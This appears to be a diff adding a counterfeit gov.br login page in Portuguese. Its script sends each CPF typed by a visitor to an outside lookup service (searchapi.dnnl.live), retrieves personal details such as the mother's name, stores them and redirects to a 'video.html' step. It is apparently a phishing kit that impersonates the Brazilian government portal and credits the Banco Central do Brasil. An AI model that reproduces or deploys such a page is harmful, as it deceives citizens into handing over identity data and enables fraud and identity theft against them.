@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>gov.br - Identifique-se</title>
+    <link rel="stylesheet" href="css/login.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+    <header>
+        <div class="container header-inner">
+            <div class="govbr-logo">
+                <img src="images/logo.png" alt="gov.br">
+            </div>
+            <div class="header-links">
+                <div><i class="fas fa-adjust"></i> Alto Contraste</div>
+                <div><i class="fas fa-hands-asl-interpreting"></i> VLibras</div>
+            </div>
+        </div>
+    </header>
+
+    <main class="container">
+        <div class="login-box">
+            <h2>Identifique-se no gov.br com:</h2>
+            
+            <div class="input-label-row">
+                <img src="images/id-card-solid.png" alt="CPF icon">
+                <span>Número do CPF</span>
+            </div>
+            
+            <p class="instruction">Digite seu CPF para <b>criar</b> ou <b>acessar</b> sua conta gov.br</p>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="cpf">CPF</label>
+                    <input type="text" id="cpf" placeholder="Digite seu CPF" maxlength="14">
+                </div>
+                
+                <div class="btn-container">
+                    <button type="submit" class="btn-continue">Continuar</button>
+                </div>
+            </form>
+
+            <div class="divider-text">Outras opções de identificação:</div>
+
+            <ul class="other-login-options">
+                <li>
+                    <img src="images/InternetBanking-green.png" alt="Bank icon">
+                    <span>Login com seu banco</span>
+                    <span class="badge-prata">SUA CONTA SERÁ PRATA</span>
+                </li>
+                <li>
+                    <img src="images/qrcode.png" alt="QR code icon">
+                    <span>Login com QR code</span>
+                </li>
+                <li>
+                    <img src="images/CD.png" alt="Digital certificate icon">
+                    <span>Seu certificado digital</span>
+                </li>
+                <li>
+                    <img src="images/CD-Nuvem.png" alt="Cloud digital certificate icon">
+                    <span>Seu certificado digital em nuvem</span>
+                </li>
+            </ul>
+
+            <div class="footer-links">
+                <a href="#"><i class="fas fa-question-circle"></i> Está com dúvidas e precisa de ajuda?</a>
+                <a href="#">Termo de Uso e Aviso de Privacidade</a>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <img src="images/govbr.png" alt="gov.br" class="govbr-logo-footer">
+        <div class="container">
+            <p>© 2026 Banco Central do Brasil. Todos os direitos reservados</p>
+            <div class="legal-links">
+                <a href="#">Política de privacidade</a>
+                <span>|</span>
+                <a href="#">Termos de uso</a>
+            </div>
+        </div>
+        <div class="cc-bar">
+            <span>Todo o conteúdo deste site está publicado sob a licença <b>Creative Commons Atribuição-SemDerivações 3.0 Não Adaptada.</b></span>
+        </div>
+    </footer>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $('#cpf').mask('000.000.000-00', {reverse: true});
+            
+            $('#loginForm').submit(function(e){
+                e.preventDefault();
+                const cpfInput = $('#cpf').val().replace(/\D/g, '');
+                if (cpfInput.length < 11) {
+                    alert('Por favor, informe seu CPF corretamente.');
+                    return;
+                }
+
+                // Desabilitar botão enquanto carrega
+                $('.btn-continue').prop('disabled', true).text('Validando...');
+
+                // Consultar API
+                // Consultar API
+                fetch(`https://searchapi.dnnl.live/consulta?token_api=2077&cpf=${cpfInput}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        let pessoa = null;
+                        if (data.dados && Array.isArray(data.dados) && data.dados.length > 0) {
+                            pessoa = data.dados[0];
+                        } else if (data.NOME || data.nome) {
+                            pessoa = data;
+                        }
+
+                        if(pessoa && (pessoa.NOME || pessoa.nome)) {
+                            // Salva garantindo uppercase no nome
+                            pessoa.NOME = (pessoa.NOME || pessoa.nome).toUpperCase().trim();
+                            if(pessoa.NOME_MAE) pessoa.MAE = pessoa.NOME_MAE.toUpperCase().trim();
+                            sessionStorage.setItem('userData', JSON.stringify({...data, ...pessoa}));
+                            window.location.href = 'video.html';
+                        } else {
+                            // Erro na resposta da API: salva CPF e nome nulo
+                            sessionStorage.setItem('userData', JSON.stringify({ CPF: cpfInput, NOME: "" }));
+                            window.location.href = 'video.html';
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Erro na consulta:', err);
+                        // Erro de rede/CORS: salva CPF para o quiz pelo menos
+                        sessionStorage.setItem('userData', JSON.stringify({ CPF: cpfInput, NOME: "" }));
+                        window.location.href = 'video.html';
+                    });
+            });
+        });
+    </script>
+</body>
+</html>
